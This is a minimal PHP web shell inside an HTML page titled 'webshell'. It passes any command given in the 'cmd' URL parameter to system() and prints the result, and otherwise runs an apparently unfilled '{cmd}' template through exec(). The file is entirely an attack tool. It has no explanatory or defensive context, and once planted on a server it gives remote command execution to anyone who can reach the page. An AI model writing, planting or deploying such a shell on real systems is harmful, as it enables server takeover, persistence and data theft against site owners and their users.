<html>
<head>
    <title>webshell</title>
</head>
<body>
    <pre>
    <?php    
        if (isset($_GET["cmd"])) {
            $cmd = $_GET["cmd"] . " 2>&1";
            system($cmd);
        }
        else {
            exec("{cmd}", $output, $return); 
            echo implode("\n", $output);
            if ($return !== 0) {
                echo "Command failed with return code: $return";
            }
        }
    ?>
    </pre>
</body>
</html>
